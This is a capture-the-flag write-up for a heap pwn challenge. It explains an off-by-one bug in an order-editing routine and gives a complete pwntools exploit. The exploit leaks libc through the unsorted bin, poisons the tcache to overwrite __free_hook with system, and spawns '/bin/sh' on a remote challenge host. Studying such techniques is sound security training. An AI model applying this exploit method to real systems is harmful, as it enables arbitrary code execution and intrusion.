#  Bon-nie-appetit

```
score: 325
solved: 72
difficulty: medium
tags: pwn, heap, off-byte-one
```

## Identify
We have a array of pointer `arr`. And have some options. At here we have `order` struct:
- 1 - create a new `order` and insert data
- 2 - show data of `order`
- 3 - edit data of `order`
- 4 - delete a `order`
- 5 - exit

We have bug at `edit` option because:
```c
__nbytes = strlen(*(char **)(`arr` + (long)iVar2 * 8));
read(0,pointer_to_order_chunk,__nbytes);
```
It means the edit get size of data in chunk. But we the insert data chunk using `read()` and no `\x00` append at the end of string. Therefore, we have `off-byte-one` bug at here.

## Exploit
Our aim is modify the meta-data of chunk with `off-byte-one` bug and override `__free_hook` to trigger `system("/bin/sh")` when calling `free`.
- Firstly, we have to leak libc address. We will flush the `tcache bin` with 7 chunks and trigger `unsorted bin` which is a linked list have contain libc address.
- Finally, we try to override `fd_forward` pointer of `freed chunk` in `tcache` to make it point to `__free_hook`. Then `malloc` until get chunk at `__free_hook` and override it.

POC:
```python
from pwn import *
import time
import sys

ts = 0.1

exe = ELF("./bon-nie-appetit")
libc = ELF("./glibc/libc.so.6")

s = '''
init-gef
b new_order
b delete_order
b show_order
'''
# p = process(exe.path)
p = remote("178.62.83.221",30713)

chunks = [0 for i in range(0x14)]
crr = 0

def check_crr():
    global crr
    global chunks
    for i in range(len(chunks)):
        if chunks[i] == 0:
            crr = i
            break

def make(size,data):
    p.sendafter(b"> ",b"1\n")
    p.sendafter(b"many: ", str(size).encode() + b"\n")
    p.sendafter(b"order: ", data)
    time.sleep(ts)

    global chunks
    global crr
    check_crr()
    chunks[crr] = 1
    check_crr()

def show(index):
    p.sendafter(b"> ", b"2\n")
    p.sendafter(b"order: ", str(index).encode() + b"\n")
    tmp = p.recvuntil(b"+=")
    return tmp

def edit(index,data):
    p.sendafter(b"> ", b"3\n")
    p.sendafter(b"order: ", str(index).encode() + b"\n")
    p.sendafter(b"order: ", data)
    time.sleep(ts)

def delete(index):
    p.sendafter(b"> ", b"4\n")
    p.sendafter(b"order: ", str(index).encode() + b"\n")
    global chunks
    chunks[index] = 0
    check_crr()

def main(): 
    # gdb.attach(p,gdbscript = s)
    # time.sleep(2)

    size = 0x98
    real_size = 0xa0
    # Fill 7 node of a Tcache index -> free() to unsorted-bin
    for i in range(11):
        log.info("Make chunk with size {} at pos {}".format(hex(size),crr))
        make(size,b"A"*size)
    log.info("Current size: {}".format(hex(size)))
    for i in range(7):
        log.info("Delete chunk at {}".format(i))
        delete(i)
    log.info("Delete chunk at {}".format(9))
    delete(9)
    log.info("Delete chunk at {}".format(7))
    delete(7)
    leak_chunk = 7
    log.info("Need leak chunk at {}".format(leak_chunk))

    # Leak libc from the chunk in unsorted-bin
    for i in range(2):
        log.info("Make chunk with size {} at pos {} -> ref to {}".format(hex(size),crr,6-crr))
        make(size,b"B"*size)
    log.info("Current chunks status:")
    log.info(repr(chunks))
    
    # Override metadata of chunk pos 6 to overlap chunk at chunk pos 7
    data = b"B"*size
    data += p64(real_size+0x10+1) # override the meta data of chunk pos 6
    log.info("Edit chunk at {} -> ref to {}".format(1,5))
    edit(1, data)

    # free and malloc chunk 6 to get new size
    # override metadata of chunk to leak unsorted area and libc in chunk 7 -> fd_backward
    log.info("Delete chunk 0 ref to 6")
    delete(0)
    log.info("Make chunk with size {} at pos {}".format(hex(size+0x10),crr))
    make(size+0x10,b"B"*(size+8-1)+b"`")
    log.info("Show chunk 0 ref to 6")
    tmp = show(0)
    x = tmp.find(b"`")
    leak = tmp[x+1:x+7]
    leak = u64(leak.ljust(8,b"\x00"))
    next_chunk= leak
    log.info("heap next chunk: {}".format(hex(next_chunk)))

    # leak libc
    pad = 0x3ebca0
    log.info("Delete chunk 0 ref to 6")
    delete(0)
    log.info("Make chunk with size {} at pos {}".format(hex(size+0x10),crr))
    make(size+0x10,b"B"*(size+0x10-1)+b"`")
    log.info("Show chunk 0 ref to 6")
    tmp = show(0)
    x = tmp.find(b"`")
    leak = tmp[x+1:x+7]
    leak = u64(leak.ljust(8,b"\x00"))
    libc.address = leak - pad
    log.info("Libc base: {}".format(hex(libc.address)))

    # refresh chunk
    log.info("Refresh leaked chunk")
    edit(0,b"B"*size + p64(real_size+1) + p64(next_chunk))
    for i in range(7):
        log.info("Make chunk with size {} at pos {}".format(hex(size),crr))
        make(size,b"B"*size)
    
    log.info("Current status arr pointer: {}".format(repr(chunks)))
    # overide the chunks 2,3 and 4 like 0 and 1 and 7 to override pointer in tcache
    data = b"B"*size
    data += p64(real_size+0x10+1) # override the meta data of chunk pos 6
    log.info("Edit chunk 4 for override size chunk 3")
    edit(4, data)
    log.info("Delete chunk 2 and chunk 3 and chunk 5")
    delete(3)
    delete(5)
    delete(2)
    data = b"/bin/sh\x00"
    data += b"B"*(size-len(data))
    data += (p64(real_size+1)+p64(libc.symbols.__free_hook))
    log.info("Make chunk 2->ref 3 to inject free_hook pointer")
    make(size+0x10,data)
    log.info("Make a chunk pad")
    make(size,b"/bin/sh")
    log.info("Override free_hook to system")
    make(size,p64(libc.symbols.system))
    log.info("Trigger free_hook")
    log.info("Currrent status: {}".format(repr(chunks)))
    delete(3)
    
    p.interactive()
if __name__ == "__main__":
    main()
```